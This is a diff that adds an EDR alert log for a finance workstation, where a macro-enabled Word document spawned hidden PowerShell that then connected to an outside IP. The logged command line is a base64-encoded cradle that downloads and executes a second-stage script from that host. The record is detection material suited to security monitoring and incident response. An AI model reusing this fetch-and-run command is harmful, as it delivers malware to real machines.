@@ -1,0 +1,13 @@
+ALERT: EDR - Office application spawned PowerShell with encoded command (High)
+Host: FIN-WS-114 (10.30.8.114), user: TREASURY\amorris
+Sysmon EventID 1 (Process Create)
+UtcTime: 2026-10-16 14:02:19.331
+ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+ParentCommandLine: "WINWORD.EXE" /n "C:\Users\amorris\Downloads\Q3_Remittance_Advice.docm"
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: powershell.exe -nop -w hidden -enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAnACkAOwBJAEUAWAAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4AOAA4ADoAOAAwADgAMAAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA==
+Hashes: SHA256=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
+
+Sysmon EventID 3 (Network Connection) 14:02:20.118
+Image: powershell.exe  DestinationIp: 203.0.113.88  DestinationPort: 8080  Initiated: true
+EDR action: none (detect only)
